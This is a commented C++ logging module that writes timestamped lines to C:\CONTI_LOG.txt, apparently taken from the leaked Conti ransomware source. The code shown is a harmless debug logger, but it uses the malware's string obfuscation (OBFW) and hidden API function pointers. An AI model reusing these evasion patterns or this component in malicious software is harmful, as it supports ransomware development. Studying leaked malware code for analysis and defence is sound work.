// Include the logs header file
#include "logs.h"


// Declare a static Critical Section object for thread synchronization
STATIC CRITICAL_SECTION g_CritSec;

// Declare and initialize a static HANDLE to the log file, with initial value INVALID_HANDLE_VALUE
STATIC HANDLE g_LogHandle = INVALID_HANDLE_VALUE;

// Define a method to initialize the logging system
VOID
logs::Init()
{
	// Initialize the critical section
	pInitializeCriticalSection(&g_CritSec);
	
	// Open or create the log file, with write access and allowing read sharing
	g_LogHandle = pCreateFileW(
		OBFW(L"C:\\CONTI_LOG.txt"),		// The name of the log file
		GENERIC_WRITE,				    // Open the file for writing
		FILE_SHARE_READ,				// Allow others to read the file while it's open
		NULL,							// Default security attributes
		OPEN_ALWAYS,					//Open the file if it exists, otherwise create the file
		FILE_FLAG_WRITE_THROUGH,		//write operations will not go through any intermediate cache
		NULL);							// No template file

	// Set the file pointer to the end of the log file
	pSetFilePointer(g_LogHandle, 0, NULL, FILE_END);
}

// Define a method to write to the log file
VOID
logs::Write(LPCWSTR Format, ...)
{
	// Check if the log file handle is valid
	if (g_LogHandle != INVALID_HANDLE_VALUE) {

		va_list Args;			// Declare a va_list to hold the variables arguments
		WCHAR Buffer[1024];		// Declare a buffer to hold the formatted message

		va_start(Args, Format);	// Initialize the variable arguments list

		// Clear the buffer and format the message into it
		RtlSecureZeroMemory(Buffer, sizeof(Buffer));
		INT Size = pwvsprintfW(Buffer, Format, Args);

		va_end(Args);			// End the use of variable arguments list

		//Check if the formatted message has any contents
		if (Size > 0) {

			LPCWSTR clrf = OBFW(L"\r\n"); // Declare CLRF sequence
			Size *= sizeof(WCHAR);		  // Calculate the size in bytes
			DWORD dwWritten;			  // Declare a variable to hold the number of bytes written

			// Enter the critical section to ensure thread-safe writing to the log file
            pEnterCriticalSection(&g_CritSec);
            {

                // Declare a buffer to hold the current time string
                WCHAR TimeBuffer[128];

                // Get the current local time
                SYSTEMTIME st;
                GetLocalTime(&st);

                // Format the time string and write it to the log file
                INT TimeSize = wsprintfW(TimeBuffer, OBFW(L"[%02d:%02d:%02d] "), st.wHour, st.wMinute, st.wSecond);
                if (TimeSize) {
                    pWriteFile(g_LogHandle, TimeBuffer, TimeSize * sizeof(WCHAR), &dwWritten, NULL);
                }

                // Write the message and a CRLF sequence to the log file
                pWriteFile(g_LogHandle, Buffer, Size, &dwWritten, NULL);
                pWriteFile(g_LogHandle, clrf, 4, &dwWritten, NULL);

            }
            // Leave the critical section after finishing the writing
            pLeaveCriticalSection(&g_CritSec);
        }
    }
}